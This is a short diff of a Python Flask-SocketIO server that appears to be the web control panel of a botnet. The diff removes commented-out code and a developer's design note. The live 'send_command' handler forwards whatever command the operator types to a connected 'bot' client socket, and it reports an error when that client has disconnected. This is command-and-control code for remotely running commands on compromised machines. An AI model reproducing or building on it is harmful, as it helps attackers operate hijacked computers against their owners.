@@ -62,31 +62,12 @@ def index():
 
 @socketio.on('send_command', namespace='/bot')
 def send(cmd):
-    # raw_output = b''
     try:
-        # raw_output = allConnections[connected].send(cmd['data'])
         botnet.getConnection(connected).send(cmd['data']+"\n")
     except:
-        # This emit makes sense since it's exceptional
         emit('response',
              {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(connected), 'user': connected})
-    # Look at the "Emitting from an External Process" section:
-    # https://flask-socketio.readthedocs.io/en/latest/
-    # We will want to "emit from a different process" in the following way:
-    # A thread globally checks all targets for stdout/stderr output, then emits anything they
-    # have said to the appropriate socketio sessions
-    # Therefore the send_receive function should probably only emit the fact that the packets
-    # was successfully sent to the target
-    # -Sumner
 
-    # if raw_output:
-    #     output = json.loads(raw_output)
-    #     stdout = output['stdout']
-    #     stderr = output['stderr']
-    #
-    #     # There will not necessarly be
-    #     emit('response',
-    #          {'stdout': stdout[:-1], 'stderr': stderr[:-1], 'user': connected})
 
 if __name__ == "__main__":
     TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
